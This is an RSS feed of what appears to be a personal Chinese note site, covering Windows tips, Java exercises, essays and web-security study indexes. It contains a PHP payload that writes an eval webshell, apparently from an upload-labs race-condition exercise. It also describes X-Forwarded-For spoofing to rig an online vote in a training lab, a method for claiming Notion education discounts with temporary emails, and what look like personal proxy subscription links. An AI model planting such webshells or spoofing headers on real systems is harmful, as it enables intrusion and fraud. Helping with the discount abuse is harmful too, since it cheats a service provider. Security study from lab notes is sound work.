开机自启 win+R打开运行窗口，输入shell:startup，打开[[开机自启目录]] 拖入你需要开机自启的可执行文件，如exe，bat</description></item><item><title>开机自启目录</title><link>https://ob.tianzhongs.ml/%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E7%9B%AE%E5%BD%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E7%9B%AE%E5%BD%95/</guid><description>运行窗口输入 shell:startup 一般是这个目录
1 C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup 把你开机需要启动的东西放到目录即可</description></item><item><title>心有所感</title><link>https://ob.tianzhongs.ml/%E5%BF%83%E6%9C%89%E6%89%80%E6%84%9F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E5%BF%83%E6%9C%89%E6%89%80%E6%84%9F/</guid><description> [[《人生第一次》观后感]] [[《算法之美》读后感]]</description></item><item><title>情镌三分木，相思万骨书</title><link>https://ob.tianzhongs.ml/%E6%83%85%E9%95%8C%E4%B8%89%E5%88%86%E6%9C%A8%E7%9B%B8%E6%80%9D%E4%B8%87%E9%AA%A8%E4%B9%A6/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E6%83%85%E9%95%8C%E4%B8%89%E5%88%86%E6%9C%A8%E7%9B%B8%E6%80%9D%E4%B8%87%E9%AA%A8%E4%B9%A6/</guid><description>情镌三分木，相思万骨书
醉、倾城
　几渚梁梦杯中尽，独影朱阁泪成诗？万里婵娟银河坠，星辰似海踏歌来。故梦千里清铃响，静候梵音斩红尘。——题记。
　那一世，你在这场缠绵的夜雨江南中为他悄悄的撑起那把泛青的油伞；我亦在烽台烛台望你千年之余，我曾听闻你为寻他走遍了千迢万里，踏过了雨雪绯林；而今离他只有那短短的一步之遥。看见你为了他在雨中温柔静候，那眼角滑落下的液体伴随着倾赋予他的漫天思念；静静的洒满这座城市的每一个角落。而我就这样静静的站在你们身后，多余的像极了一幅煞乱风景的残墨；顷刻间充斥着幸福流淌过的每一条暖流。但你是否曾知晓？那雨水从天而降肆无忌惮的在我的脸颊划落；泪水也参杂在雨水里紧附着思念随波逐流的晕开视线里残留下的最后一幅画面。也许你永远都不会知道，今生的我为了等候你那不轻易的回首；似乎比你等他的时间还要长。
　听人说一个人的时候，温起壶中酒；独倚拜月楼，望着庭中盛放的满院流光；凄冷的冬风定会静静的摇落下一地的相思，只为承载起那些忧伤孤独的过往，在岁月的年轮中不停的刻圈成画；却始终画不到那个所谓的终点。有你的曾经一直潜藏在故事里蔓延着最为凄美的片段，梦中的枯藤已千年不绿；被风吹干后的答案；夺走了彼此记忆中最为动人的拥抱。那些禁锢在心底深处的怅然，冲淡了相聚时的喜悦与快乐；难以掩盖的忧伤中载满了无法清点不舍与难过。
　人生短短十数载，梁月何时绕梦中？当彼此的相遇早已为离别埋下了深深的伏笔，当插肩而过时也不会在为过客不留的画面挽留下最后一丝温存；回忆总是美的让人心碎，曾经的过往依旧使人这般沉吟至今。或许那般留恋本不应该赖在记忆中，转进我心里霸占着每一寸缝隙。
　冬日春雨几月寒，半阕红豆怎续情？望穿了奈何秋水，我们终究还是等不到那不期而遇的再见。少了梦里梦外的花开，你说着曾经的相遇是如此的云淡风轻，我想着坐拥过着有你的岁月铅华；那时的我梦中藤萝不香醒，梦醒时节花落西厢。敛一轮皓月星空，抒一卷痴情惘然。怎奈文字铺垫的岁月里依旧美轮美奂，不禁让人再次心涌执念；荡漾起那假睡着的海誓山盟。我曾想待你拂去我眉宇间的忧愁，我愿牵起你的手浪迹天涯。最为灿烂的爱情，过界后也不过是烟花转瞬繁落一季。真正的爱情必然是经得起流年锦瑟的厮守，相伴过帘卷云舒的夕霞；也会共赏着烟雨散尽后的那一池澄碧。而此时的冬风枯叶镌落下一</description></item><item><title>手写代码问题</title><link>https://ob.tianzhongs.ml/%E6%89%8B%E5%86%99%E4%BB%A3%E7%A0%81%E9%97%AE%E9%A2%98/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E6%89%8B%E5%86%99%E4%BB%A3%E7%A0%81%E9%97%AE%E9%A2%98/</guid><description>手写代码问题 手写不熟练的代码 整个文件夹复制,已熟练 写不来的 [[手写单向链表结构]] [[手写学生信息系统]] 奇数偶数轮流输出多线程，同步锁</description></item><item><title>手写单向链表结构</title><link>https://ob.tianzhongs.ml/%E6%89%8B%E5%86%99%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8%E7%BB%93%E6%9E%84/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E6%89%8B%E5%86%99%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8%E7%BB%93%E6%9E%84/</guid><description>手写单向链表结构 编写程序实现单向链表数据结构： public class Node { Object data; Node next; } public class MyLinkedList{ Node header; &amp;hellip;. // 添加数据的方法 // 删除数据的方法 // 修改数据的方法 // 查找数据的方法 // 打印集合中每个元素的方法 }</description></item><item><title>手写学生信息系统</title><link>https://ob.tianzhongs.ml/%E6%89%8B%E5%86%99%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E6%89%8B%E5%86%99%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F/</guid><description>手写学生信息系统 1、请使用序列化和反序列化机制，完成学生信息管理系统。
系统打开时显示以下信息： 欢迎使用学生信息管理系统，请认真阅读以下使用说明： 请输入不同的功能编号来选择不同的功能： [1]查看学生列表 [2]保存学生 [3]删除学生 [4]查看某个学生详细信息
学生信息列表展示 学号 姓名 性别 1 zhangsan 男 2 lisi 女 &amp;hellip;.</description></item><item><title>手机wifi局域网内的代理</title><link>https://ob.tianzhongs.ml/%E6%89%8B%E6%9C%BAwifi%E5%B1%80%E5%9F%9F%E7%BD%91%E5%86%85%E7%9A%84%E4%BB%A3%E7%90%86/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E6%89%8B%E6%9C%BAwifi%E5%B1%80%E5%9F%9F%E7%BD%91%E5%86%85%E7%9A%84%E4%BB%A3%E7%90%86/</guid><description>打开电脑clash，打开允许局域网代理 记住端口号 打开手机wifi设置 连接wifi，打开详细设置 选择代理-&amp;gt;手动代理，分别设置代理ip以及端口号 代理IP，电脑上ipconfig，查看wifi的局域网ip 端口设置clash中开启的代理端口
[[其他]] :: 手机端的telegram貌似不能通过这种方式登录</description></item><item><title>投票系统程序设计缺陷分析</title><link>https://ob.tianzhongs.ml/%E6%8A%95%E7%A5%A8%E7%B3%BB%E7%BB%9F%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%88%86%E6%9E%90/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E6%8A%95%E7%A5%A8%E7%B3%BB%E7%BB%9F%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%88%86%E6%9E%90/</guid><description>投票系统程序设计缺陷分析 🔗MetaURL: https://www.mozhe.cn/bug/detail/anBmazJ1NWIvcnZmcldxMnUvdzZKQT09bW96aGUmozhe
背景介绍 年终了，公司组织了各单位&amp;quot;文明窗口&amp;quot;评选网上投票通知。
实训目标 1、了解浏览器插件的使用； 2、了解开发程序员对IP地址获取方式； 3、了解网络协议软件的使用，如burpsuite等；
解题方向 点击ggg投票进行抓包
添加X-Forwarded-For字段</description></item><item><title>摘取</title><link>https://ob.tianzhongs.ml/%E6%91%98%E5%8F%96/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E6%91%98%E5%8F%96/</guid><description> [[莫名很喜欢这个文案]] [[你是我三十六度的风]] [[情镌三分木，相思万骨书]] [[如何写出令人心动的个人陈述]] [[信封]] [[过来程序员的经验]] [[将压缩包放进图片里]]</description></item><item><title>收集箱</title><link>https://ob.tianzhongs.ml/%E6%94%B6%E9%9B%86%E7%AE%B1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E6%94%B6%E9%9B%86%E7%AE%B1/</guid><description> 软件 [[软件工具]] [[网站收集]]</description></item><item><title>文件上传漏洞</title><link>https://ob.tianzhongs.ml/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</guid><description> [[01-文件上传漏洞的原理]] [[02-webshell工具]] [[03-网站控制工具]] [[05-文件上传漏洞的利用与防御]] [[靶场]] [[条件竞争]]</description></item><item><title>文件包含漏洞</title><link>https://ob.tianzhongs.ml/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</guid><description> [[01-什么是文件包含漏洞]] [[02-php中文件上传漏洞相关函数和伪协议]] [[03-dvwa]] [[04-ctfhub]] [[05-文件包含漏洞挖掘与利用]] [[06-文件包含漏洞的防御与修复]]</description></item><item><title>条件竞争</title><link>https://ob.tianzhongs.ml/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/</guid><description>1 2 3 4 &amp;lt;?PHP echo md5(1); fputs(fopen(&amp;#39;3.php&amp;#39;,&amp;#39;w&amp;#39;),&amp;#39;&amp;lt;?php @eval($_POST[1])?&amp;gt;&amp;#39;); ?&amp;gt;</description></item><item><title>禁用笔记本自带键盘四种方法</title><link>https://ob.tianzhongs.ml/%E7%A6%81%E7%94%A8%E7%AC%94%E8%AE%B0%E6%9C%AC%E8%87%AA%E5%B8%A6%E9%94%AE%E7%9B%98%E5%9B%9B%E7%A7%8D%E6%96%B9%E6%B3%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E7%A6%81%E7%94%A8%E7%AC%94%E8%AE%B0%E6%9C%AC%E8%87%AA%E5%B8%A6%E9%94%AE%E7%9B%98%E5%9B%9B%E7%A7%8D%E6%96%B9%E6%B3%95/</guid><description>笔记本外接键盘之后，老是误触笔记本自带键盘，整理一些禁用笔记本自带键盘的方法
方便我的：不要使用以下命令，这是方便我的笔记
1 2 pnputil /removedevice &amp;#34;HIDVID_320F&amp;amp;PID_5055&amp;amp;MI_01&amp;amp;COL01\7&amp;amp;2D4F6D52&amp;amp;0&amp;amp;0000&amp;#34; pnputil /removedevice &amp;#34;HIDVID_048D&amp;amp;PID_C100&amp;amp;COL03\6&amp;amp;8BB26F5&amp;amp;0&amp;amp;0002&amp;#34; 目前主要有以下几种办法：
第一种：CMD 命令 我的电脑这种方法不管用</description></item><item><title>稻谷</title><link>https://ob.tianzhongs.ml/%E7%A8%BB%E8%B0%B7/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E7%A8%BB%E8%B0%B7/</guid><description>捣鼓的谐音，用来折腾一些玩意的记录 。
[[自建七牛云图床]] [[临时邮箱]] [[手机wifi局域网内的代理]] [[音乐下载]] [[js方式显示base64文件为图片]] 电脑 [[三步简单解决3306端口占用问题]] [[代理链接]] [[禁用笔记本自带键盘四种方法]] [[开机自启以管理员运行bat文件]] [[联想拯救者系列电脑WIFI断连或无网络连接]] [[开机自启目录]] Notion [[Notion优惠券]] [[Notion自定义域名]] [[首发-任意Notion账号获取教育优惠]] AI [[chatgpt]] 手机 [[ADB命令]] [[安卓相册图片隐藏]] [[刷机常用]] 博客 [[Vercel自定义域名]] [[nextjs-notion-blog]] RSS [[RSS聚合器—如何高效查看互联网信息]] 笔记软件 [[logseq]]</description></item><item><title>类加载器</title><link>https://ob.tianzhongs.ml/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/</guid><description>类加载器 类加载器 Created: August 9, 2022 1:53 PM Tags: 类加载
概述 专门负责加载类的命令/工具。 ClassLoader
分类 JDK中自带了3个类加载器
启动类加载器:rt.jar 扩展类加载器:ext/*.jar 应用类加载器:classpath （你设置的那个环境变量） 解释 String s = &amp;ldquo;abc&amp;rdquo;;</description></item><item><title>网安</title><link>https://ob.tianzhongs.ml/%E7%BD%91%E5%AE%89/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E7%BD%91%E5%AE%89/</guid><description> 00-[[网安工具]] 01-[[信息收集]] 02-[[sql注入]] 03-[[xss]] 04-[[csrf]] 05-[[文件上传漏洞]] 06-[[文件包含漏洞]] 07-[[xxe]] 08-[[ssrf]] 09-[[RCE]] [[靶场]] [[网安小项]]</description></item><item><title>网安小项</title><link>https://ob.tianzhongs.ml/%E7%BD%91%E5%AE%89%E5%B0%8F%E9%A1%B9/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E7%BD%91%E5%AE%89%E5%B0%8F%E9%A1%B9/</guid><description> [[墨者学院]]</description></item><item><title>网安工具</title><link>https://ob.tianzhongs.ml/%E7%BD%91%E5%AE%89%E5%B7%A5%E5%85%B7/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E7%BD%91%E5%AE%89%E5%B7%A5%E5%85%B7/</guid><description> [[网站控制工具]] [[中国蚁剑]] [[burp sulite]] [[中国蚁剑]]</description></item><item><title>网站控制工具</title><link>https://ob.tianzhongs.ml/%E7%BD%91%E7%AB%99%E6%8E%A7%E5%88%B6%E5%B7%A5%E5%85%B7/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E7%BD%91%E7%AB%99%E6%8E%A7%E5%88%B6%E5%B7%A5%E5%85%B7/</guid><description>[[03-网站控制工具]]</description></item><item><title>网站收集</title><link>https://ob.tianzhongs.ml/%E7%BD%91%E7%AB%99%E6%94%B6%E9%9B%86/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E7%BD%91%E7%AB%99%E6%94%B6%E9%9B%86/</guid><description>模仿各个操作系统： Simone&amp;rsquo;s Computer 办公领域 [[ppt]] [[模板]]下载 PPT模板_PPT模板免费下载_免费PPT模板下载 - 【爱PPT】 (2ppt.com) 毕业设计 https://www.ypppt.com/ [[ppt]]生成 怡氧大纲笔记|自动生成PPT|文字大纲一键自动生成放映级演示 (jianguoyun.</description></item><item><title>网络安全</title><link>https://ob.tianzhongs.ml/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/</guid><description> 网安小项 [[投票系统程序设计缺陷分析]]</description></item><item><title>联想拯救者系列电脑WIFI断连或无网络连接</title><link>https://ob.tianzhongs.ml/%E8%81%94%E6%83%B3%E6%8B%AF%E6%95%91%E8%80%85%E7%B3%BB%E5%88%97%E7%94%B5%E8%84%91WIFI%E6%96%AD%E8%BF%9E%E6%88%96%E6%97%A0%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E8%81%94%E6%83%B3%E6%8B%AF%E6%95%91%E8%80%85%E7%B3%BB%E5%88%97%E7%94%B5%E8%84%91WIFI%E6%96%AD%E8%BF%9E%E6%88%96%E6%97%A0%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/</guid><description>问题 网页出现无网络连接，但是wifi连着的情况
解决 可以通过修改网卡的电脑节省设置
win+x，选择打开设备管理器 {:height 404, :width 51} 选择网络适配器的无线网卡，点击属性 修改电源管理，取消勾选 {:height 698, :width 214} 如果还不行，修改
测试结果 随着windows更新，我的电脑没有出现这类问题，但是如果你的电脑有此类问问题，不妨可以试试。</description></item><item><title>自建七牛云图床</title><link>https://ob.tianzhongs.ml/%E8%87%AA%E5%BB%BA%E4%B8%83%E7%89%9B%E4%BA%91%E5%9B%BE%E5%BA%8A/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E8%87%AA%E5%BB%BA%E4%B8%83%E7%89%9B%E4%BA%91%E5%9B%BE%E5%BA%8A/</guid><description>使用图床的原因是方便迁移，但是缺点是，需要网络； 对于自己的知识库来说，图床是完全没有必要的，因为本地可以随时打开，比网络加载要好很多； 但是对于需要分享的内容来说，图床则是有很多的优点，目前市面上的笔记几乎都支持 markdown。如此，图床的图片链接就方便的很多。说白了，就是方便迁移 hexo 以及一些自建的服务，图片链接的路径可能采用了不同的规则。比如 hexo 需要使用项目根路径作为相对路径，更多的则是采用当前文件为相对路径的起始路径。但是网络 url 几乎是所有都兼容的。这大致就是图床的必要性吧 所需 七牛云 picgo，手机端可以采用小白图床 域名，方便以后图片迁移 使用七牛云的原因是，域名不用备案，同样有https协议。可以采用三方cloudflare托管域名，可玩性更高，不过可能速度会可能会变慢。</description></item><item><title>莫名很喜欢这个文案</title><link>https://ob.tianzhongs.ml/%E8%8E%AB%E5%90%8D%E5%BE%88%E5%96%9C%E6%AC%A2%E8%BF%99%E4%B8%AA%E6%96%87%E6%A1%88/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E8%8E%AB%E5%90%8D%E5%BE%88%E5%96%9C%E6%AC%A2%E8%BF%99%E4%B8%AA%E6%96%87%E6%A1%88/</guid><description>莫名很喜欢这个文案 [莫名很喜欢这个文案：
你知道，我有很多朋友。
你介意过，我有很多朋友。
我天生长袖善舞，如果愿意，可以把结识的所有人结交成朋友。
除了你。
我永远不想，和你做朋友。
我永远不会再主动发消息给你，
永远不会再和朋友提起你，
永远会控制自己，不再想到你。
你永远在我联系人的最末一位。
和第一位隔了五十三页。
所以有时候我想起你，就一点一点向下翻。
翻到了,就不再那么想你了。
你知道吗?
我的,好朋友。</description></item><item><title>订阅</title><link>https://ob.tianzhongs.ml/%E8%AE%A2%E9%98%85/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E8%AE%A2%E9%98%85/</guid><description> GLaDOS 50天 https://update.glados-config.com/clash/298632/2761528/68154/glados-android.yaml https://update.glados-config.com/clash/298632/2761528/68154/glados.yaml</description></item><item><title>路径的移植性问题</title><link>https://ob.tianzhongs.ml/%E8%B7%AF%E5%BE%84%E7%9A%84%E7%A7%BB%E6%A4%8D%E6%80%A7%E9%97%AE%E9%A2%98/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E8%B7%AF%E5%BE%84%E7%9A%84%E7%A7%BB%E6%A4%8D%E6%80%A7%E9%97%AE%E9%A2%98/</guid><description>路径的移植性问题 路径的移植性问题 Created: August 9, 2022 2:10 PM
文件路径的移植性问题：根据src获取文件的绝对路径 关键语句
获取路径： String path=Thread.currentThread().getContextClassLoader().getResource(&amp;quot;com/reflect/t1/test.txt&amp;quot;).getPath();
流的方式返回（方便获取配置文件）：InputStream reader=Thread.*currentThread*().getContextClassLoader().getResourceAsStream(&amp;quot;peizhi.properties&amp;quot;);
比如是在类根文件夹下的文件才可以（src目录会复制到out的project目录下）
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import java.</description></item><item><title>软件工具</title><link>https://ob.tianzhongs.ml/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/</guid><description>[[pdf阅读器]]：阅读器  SumatraPDF [[搜索]]工具： everything [[图片工具]] 让图片更清晰： alibaba/MNN: MNN is a blazing fast, lightweight deep learning framework, battle-tested by business-critical use cases in Alibaba (github.</description></item><item><title>过来程序员的经验</title><link>https://ob.tianzhongs.ml/%E8%BF%87%E6%9D%A5%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E7%BB%8F%E9%AA%8C/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E8%BF%87%E6%9D%A5%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E7%BB%8F%E9%AA%8C/</guid><description>在这个行业里，每个人基本上都是自学成才的。对于传统的教育机构来说，科技的发展速度实在是太快了。如果你想快速上手一些东西，你最好自己立刻开始学习，而不是又去教室里听三年的课。
传统教育在基础研究中仍然占有一席之地。获得学士学位是踏入职场的一种方式，但并不是唯一的方式。如果你的大脑更注重实际，而不是更偏好理论，而且你无法偿还未来10年的助学贷款，那么你可以在现在的互联网上找到更多的学习资源和指导。
要想进入这个行业，你必须永远保持好奇心。你需要不停地问自己这一切是如何运作的，为什么会这样——尤其是当一切终于有了眉目的时候。
在很长一段时间内，你可能会觉得自己并没有多少真正的进步——直到你回过头去看自己原来写的旧代码，或者必须向其他人解释一些东西的时候。
作为初级开发人员，还是要多写写代码才好。学习编程就像学习写作一样。你写得越多，你就越能发现其中的套路、你的短板之所在以及修正它们的方法。
作为行业新手，一开始你会处于一个自大的阶段，认为自己什么都知道。然后随着你写的代码越来越多，你会发现曾经那个膨胀的自我正在逐渐缩小。然后，当你越来越得心应手、经验也越来越足的时候，你甚至有能力引导那些经验不足的同龄人朝正确的方向前进，但你也会让他们稍微“挣扎”一下，因为这是他们学习和创造过程的一部分。
漏洞的出现在所难免，发生漏洞是因为知识上的差距。代码在转换成“计算机语言”的时候或多或少总会出点问题，不要慌。当出现漏洞的时候，很可能只是因为“转换过程”中出现了一个小问题。
当人们告诉你你在做敏捷开发，但不让你参与对此会产生的直接影响计划阶段时，那一定不是真正的敏捷开发。
作为一名开发人员，你在工作时将长期处于一种不断了解但同时又不怎么了解的状态。
在可读性方面，格式是决定性因素。
代码是一种通信工具，一种以一种人类可读的方式编写的通信工具，而不是只有初学者才能理解的密码名。
面向函数编程模式可以使事情变得不那么复杂。面向对象编程模式在作为组织和分类工具方面也颇为有用。这两种模式并不是相互排斥的，而是在必要时是共存的。
写代码要稳扎稳打，从长远来看，当前以“最佳实践”为目的的过度取巧可能导致未来有太多的技术短板要补。
所有的软件迭代都很快。5个月前的“完美”代码可能会由于需</description></item><item><title>靶场</title><link>https://ob.tianzhongs.ml/%E9%9D%B6%E5%9C%BA/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E9%9D%B6%E5%9C%BA/</guid><description> [[upload-labs]] [[pikachu]]</description></item><item><title>音乐下载</title><link>https://ob.tianzhongs.ml/%E9%9F%B3%E4%B9%90%E4%B8%8B%E8%BD%BD/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E9%9F%B3%E4%B9%90%E4%B8%8B%E8%BD%BD/</guid><description> https://tool.liumingye.cn/music/#/search</description></item><item><title>首发-任意Notion账号获取教育优惠</title><link>https://ob.tianzhongs.ml/%E9%A6%96%E5%8F%91-%E4%BB%BB%E6%84%8FNotion%E8%B4%A6%E5%8F%B7%E8%8E%B7%E5%8F%96%E6%95%99%E8%82%B2%E4%BC%98%E6%83%A0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E9%A6%96%E5%8F%91-%E4%BB%BB%E6%84%8FNotion%E8%B4%A6%E5%8F%B7%E8%8E%B7%E5%8F%96%E6%95%99%E8%82%B2%E4%BC%98%E6%83%A0/</guid><description>💡 notion教育优惠，基本上已经可以满足个人的所有使用场景了。目前发现的唯一不足是不能像别的计划一样，给team中添加member。 效果图：qq邮箱的教育优惠
声明 💡 和官方的教育优惠完全一致，可以说是官方没有修复的bug，不清楚未来是否会修复，不过我没有泄露。 我也不太清楚这个bug的原因是什么，之前一直没有发现，我估计之前在淘宝售卖的永久空间和这个有异曲同工之处。
步骤 首先你需要有一个教育邮箱的账号，没有也没有关系，可以用临时教育邮箱账号[[临时邮箱]]
notion除了接受edu的教育邮箱，还有一些其他特殊的教育邮箱后缀。 使用临时教育邮箱注册一个notion账号
使用自己的账号，在自己的账户中，将临时教育邮箱作为member添加到你的空间。（需要注意的是，只有一些计划才可以添加，如果不可以添加，可以试试将你的计划降低）</description></item></channel></rss>